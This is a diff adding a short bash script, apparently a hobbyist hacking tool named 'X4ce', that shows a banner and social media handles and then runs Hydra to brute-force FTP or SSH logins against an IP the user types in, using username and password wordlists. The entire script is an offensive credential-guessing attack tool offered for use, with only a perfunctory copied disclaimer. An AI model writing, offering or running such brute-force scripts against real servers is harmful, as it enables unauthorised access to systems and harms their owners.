@@ -1,0 +1,63 @@
+#!/bin/bash
+clear
+echo "$(tput setaf 2)welcome to X4ce "
+echo "$(tput setaf 1)
+
+  ***          **
+ *****       ****  *
+*   ***      ******
+     ***    *   **
+      ***  *
+       ****                ****       ***
+        ***               * ***  *   * ***
+        ****             *   ****   *   ***
+       *  ***           **         **    ***
+      *    ***          **         ********
+     *      ***         **         *******
+    *        ***        **         **
+   *          ***   * $(tput setaf 47)4$(tput setaf 1) ***     *  ****    *
+  *            *****     *******    *******
+ *              ***       *****      ***** "
+
+echo""
+echo "$(tput setaf 47) # facebook.com/virus.system007"
+echo " # @rikkimartin.rin"
+echo " # YT Exsyio Tech"
+echo ""
+echo -e  "1 [==> FTP\n2 [==> SSH"
+echo ""
+echo -n "$(tput setaf 7)choice what you want to brute force : "
+read target
+for ip in $target; do
+	clear
+	echo "$(tput setaf 1)WARNING "
+	echo ""
+	echo "$(tput setaf 2)Please don't use in military or secret" 
+	echo "service organizations or for illegal purposes "
+	echo "Hydra v9.0 (c) 2019 by van Hauser/THC "
+	echo ""
+	echo -n "$(tput setaf 7)Enter your target ip : "
+	read i
+	clear
+	echo ""
+	case  $target in
+		1) echo "                 -----------> start attack the target <-------------"
+                       echo ""
+		    hydra -L username.txt -P password.txt -t 4 -Vv $i ftp
+			echo ""
+			echo "                      ---------------> Done <--------------"
+			;;
+		2)        echo "                -----------> start attack the target <--------------"
+		            echo ""
+		     hydra -L username.txt -P password.txt -t 4 -Vv ssh://$i | sed '1,3d'
+			echo ""
+                           echo "                          ---------------> Done <--------------"
+			;;
+		*)  clear
+			  echo ""
+   	    			echo "pilih yang bener woi lu bego y ?"
+	    			    echo ""
+					break
+			;;
+esac
+done
